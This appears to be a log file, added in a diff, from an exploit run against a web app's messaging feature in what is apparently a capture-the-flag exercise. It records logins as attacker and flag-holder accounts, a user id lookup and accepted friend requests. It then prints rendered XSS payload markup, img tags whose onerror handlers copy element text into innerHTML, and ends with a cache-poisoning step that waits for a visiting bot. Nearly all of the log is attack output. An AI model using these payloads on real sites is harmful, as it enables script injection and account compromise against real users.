@@ -1,0 +1,15 @@
+[*] auth 'Hacker ': ok (200)
+[*] auth 'FlagHolder ': ok (200)
+[*] 'FlagHolder ' id=4
+[*] accepted 0 friend request(s)
+[*] rendered payload markup:
+    <p id="zq">
+    <p id="zp">
+    <img onerror="zp.innerHTML=zq.textContent" class="message-image" src="data:image/png;base64,QUJD" alt="Shared image">
+    <p id="zq">
+    <p id="zp">
+    <img onerror="zp.innerHTML=zq.textContent" class="message-image" src="data:image/png;base64,QUJD" alt="Shared image">
+    <p id="zq">
+    <p id="zp">
+    <img onerror="zp.innerHTML=zq.textContent" class="message-image" src="data:image/png;base64,QUJD" alt="Shared image">
+[*] poisoning cache key 'Hacker:FlagHolder'; waiting up to 6.0 min for bot cycles. Watch: ctf-catch log -n 40
